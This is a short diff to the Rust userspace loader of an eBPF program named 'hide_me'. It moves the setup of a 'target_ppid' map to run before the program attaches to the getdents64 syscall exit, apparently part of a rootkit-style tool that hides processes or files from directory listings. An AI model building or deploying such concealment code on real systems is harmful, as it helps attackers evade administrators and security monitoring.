@@ -43,6 +43,13 @@ async fn main() -> Result<(), anyhow::Error> {
         // This can happen if you remove all log statements from your eBPF program.
         warn!("failed to initialize eBPF logger: {}", e);
     }
+
+
+    let mut target_ppid: HashMap<_, u8, i32> =
+        HashMap::try_from(bpf.map_mut("target_ppid").unwrap())?;
+
+    target_ppid.insert(0, &opt.ppid, 0).unwrap();
+
     let program: &mut TracePoint = bpf.program_mut("hide_me").unwrap().try_into()?;
     program.load()?;
     program.attach("syscalls", "sys_exit_getdents64")?;
@@ -64,10 +71,6 @@ async fn main() -> Result<(), anyhow::Error> {
     let prog_1_fd = prog_1.fd().unwrap();
     prog_array.set(1, prog_1_fd, 0).unwrap();
 
-    let mut target_ppid: HashMap<_, u8, i32> =
-        HashMap::try_from(bpf.map_mut("target_ppid").unwrap())?;
-
-    target_ppid.insert(0, &opt.ppid, 0).unwrap();
 
     info!("Waiting for Ctrl-C...");
     signal::ctrl_c().await?;
